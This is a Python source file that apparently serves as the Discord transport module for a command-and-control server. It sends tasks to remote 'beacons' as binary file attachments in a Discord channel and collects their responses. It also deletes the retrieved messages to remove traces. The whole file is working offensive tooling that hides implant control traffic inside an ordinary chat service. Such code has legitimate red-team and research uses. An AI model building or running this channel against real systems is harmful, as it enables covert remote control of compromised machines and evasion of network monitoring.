import discord
import os
import asyncio
from time import sleep  # Importing sleep from time module
import uuid
from bot_client import client

# Global client object for Discord

# Channel where tasks and responses are communicated
COMMAND_CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID')) # Replace with your command channel ID
TASK_PREFIX = 'TaskForYou'
RESP_PREFIX = 'RespForYou'


def writeToBinFile(data, fileName):
    """
    Writes binary data to a .bin file.
    """
    with open(fileName, "wb") as f:
        f.write(data)

def readFromBinFile(fileName):
    """
    Reads binary data from a .bin file.
    """
    with open(fileName, "rb") as f:
        return f.read()


def prepTransport():
    """
    Prepares the transport for communication. For Discord, no specific preparation is needed.
    """
    return 0


async def sendData(data, beaconId):
    """
    Sends data (task) to the beacon (agent) via a Discord message as a binary file.
    """
    keyName = "{}:{}".format(beaconId, TASK_PREFIX)
    fileName = f"{keyName}.bin"
    
    # Convert data to a .bin file
    writeToBinFile(data, fileName)
    
    # Send the .bin file as an attachment
    channel = client.get_channel(COMMAND_CHANNEL_ID)
    if channel:
        file = discord.File(fileName, filename=fileName)
        await channel.send(file=file)
        os.remove(fileName)  # Clean up the file after sending
    else:
        print(f"Error: Could not find command channel {COMMAND_CHANNEL_ID}")


async def retrieveData(beaconId):
    """
    Retrieves data (response) from the beacon via Discord messages, expecting binary file attachments.
    """
    keyName = "{}:{}".format(beaconId, RESP_PREFIX)
    channel = client.get_channel(COMMAND_CHANNEL_ID)
    taskResponses = []
    
    if channel:
        async for message in channel.history(limit=2):  # Adjust the limit based on need
            if message.attachments:
                for attachment in message.attachments:
                    if attachment.filename.startswith(keyName):
                        # Download the .bin file
                        fileName = attachment.filename
                        await attachment.save(fileName)
                        
                        # Read the binary data from the file
                        data = readFromBinFile(fileName)
                        taskResponses.append(data)
                        
                        os.remove(fileName)  # Clean up after reading
                        await message.delete()  # Delete the message after retrieving the file
        return taskResponses
    else:
        print(f"Error: Could not find command channel {COMMAND_CHANNEL_ID}")
        return []






# For usage in the main server script, you would initialize the client like this:
# init_discord_client('YOUR_DISCORD_BOT_TOKEN')